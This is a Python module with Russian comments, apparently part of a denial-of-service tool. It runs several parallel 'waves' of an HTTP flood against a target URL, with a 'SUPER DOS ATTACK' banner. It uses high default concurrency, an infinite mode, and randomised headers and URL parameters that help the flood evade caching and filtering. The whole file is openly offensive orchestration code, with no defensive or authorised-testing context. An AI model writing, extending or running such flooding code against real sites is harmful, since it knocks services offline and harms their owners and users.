import asyncio
import time
from colorama import init, Fore, Style

# Инициализация colorama для Windows
init(autoreset=True)


def print_info(msg: str, color: str = Fore.GREEN):
    """Вывод цветного сообщения."""
    print(f"{color}{msg}{Style.RESET_ALL}")


def print_header(title: str):
    """Вывод заголовка."""
    print(f"\n{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{title:^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}\n")


async def run_wave(wave_num: int, url: str, sessions: int, concurrency: int, 
                  requests_limit: int, is_inf: bool, use_post: bool, 
                  use_random_headers: bool, use_random_params: bool, 
                  shared_stats: dict, lock: asyncio.Lock):
    """Запуск одной волны multi атаки."""
    from multi import multi_main
    
    # Убрали заголовок для каждой волны - только один заголовок в super_main
    # print_header(f"=== WAVE {wave_num} STARTED ===")
    
    wave_stats = await multi_main(
        url=url,
        sessions=sessions,
        concurrency=concurrency,
        requests_limit=requests_limit,
        is_inf=is_inf,
        use_post=use_post,
        use_random_headers=use_random_headers,
        use_random_params=use_random_params,
        show_header=False  # Не показывать заголовок для каждой волны
    )
    
    async with lock:
        if wave_stats:
            shared_stats['total_requests'] += wave_stats.get('total', 0)
            shared_stats['total_errors'] += wave_stats.get('errors', 0)
        shared_stats['waves_completed'] += 1
    
    return wave_stats


async def super_main(
    url: str,
    sessions: int = 5,
    concurrency: int = 200,
    requests_limit: int = 0,
    is_inf: bool = False,
    use_post: bool = False,
    use_random_headers: bool = True,
    use_random_params: bool = True,
    runs: int = 3
):
    """Запуск нескольких параллельных волн multi атаки."""
    
    print_header("SUPER DOS ATTACK")
    print_info(f"Target: {url}", Fore.BLUE)
    print_info(f"Waves (parallel): {runs}")
    print_info(f"Sessions per wave: {sessions}")
    print_info(f"Concurrency per session: {concurrency}")
    print_info(f"Total potential concurrency: {sessions * concurrency * runs}")
    
    if use_random_headers:
        print_info(f"Random Headers: ENABLED", Fore.GREEN)
    if use_random_params:
        print_info(f"Random URL Params: ENABLED", Fore.GREEN)
    if use_post:
        print_info(f"POST Requests: ENABLED", Fore.GREEN)
    
    if is_inf or requests_limit == 0:
        print_info("Mode: INFINITE (Ctrl+C to stop)", Fore.YELLOW)
    else:
        print_info(f"Mode: LIMITED to {requests_limit} requests per session", Fore.YELLOW)
    
    print_info("Press Ctrl+C to stop\n", Fore.YELLOW)
    
    # Общая статистика
    shared_stats = {
        'total_requests': 0,
        'total_errors': 0,
        'waves_completed': 0,
        'waves_total': runs,
        'start_time': time.time()
    }
    lock = asyncio.Lock()
    
    # Создаём задачи для всех волн
    tasks = [
        run_wave(
            wave_num=i + 1,
            url=url,
            sessions=sessions,
            concurrency=concurrency,
            requests_limit=requests_limit,
            is_inf=is_inf,
            use_post=use_post,
            use_random_headers=use_random_headers,
            use_random_params=use_random_params,
            shared_stats=shared_stats,
            lock=lock
        )
        for i in range(runs)
    ]
    
    # Запускаем все волны параллельно
    interrupted = False
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        interrupted = True
        print_info("\n\n>> INTERRUPTED BY USER <<", Fore.YELLOW)
    
    # Итоговая статистика
    elapsed = time.time() - shared_stats['start_time']
    
    print("\n")
    print_header("=== SUPER ATTACK COMPLETE ===")
    print_info(f"Waves Completed: {shared_stats['waves_completed']}/{shared_stats['waves_total']}", Fore.CYAN)
    print_info(f"Total Requests: {shared_stats['total_requests']}", Fore.RED)
    print_info(f"Total Errors: {shared_stats['total_errors']}", Fore.YELLOW)
    
    if elapsed > 0:
        avg_rps = shared_stats['total_requests'] / elapsed
        print_info(f"Total Time: {elapsed:.1f}s", Fore.CYAN)
        print_info(f"Average RPS: {avg_rps:.1f} req/s", Fore.BLUE)
    
    print_info(f"Total Runs: {runs}", Fore.YELLOW)


def main(
    url: str,
    sessions: int = 5,
    concurrency: int = 200,
    requests_limit: int = 0,
    is_inf: bool = False,
    use_post: bool = False,
    use_random_headers: bool = True,
    use_random_params: bool = True,
    runs: int = 3
):
    """Точка входа."""
    # Преобразуем строку в bool если нужно
    if isinstance(is_inf, str):
        is_inf = is_inf.lower() == 'y'
    
    try:
        asyncio.run(super_main(
            url=url,
            sessions=sessions,
            concurrency=concurrency,
            requests_limit=requests_limit,
            is_inf=is_inf,
            use_post=use_post,
            use_random_headers=use_random_headers,
            use_random_params=use_random_params,
            runs=runs
        ))
    except KeyboardInterrupt:
        print_info("\nInterrupted by user", Fore.YELLOW)


def use(req_per_con: int, is_inf: str, url: str, session: int, runs: int = 3, use_post: bool = False, use_random_headers: bool = True, use_random_params: bool = True):
    """Функция для совместимости с main.py."""
    main(
        url,
        sessions=session,
        concurrency=req_per_con,
        is_inf=is_inf,
        use_post=use_post,
        use_random_headers=use_random_headers,
        use_random_params=use_random_params,
        runs=runs
    )
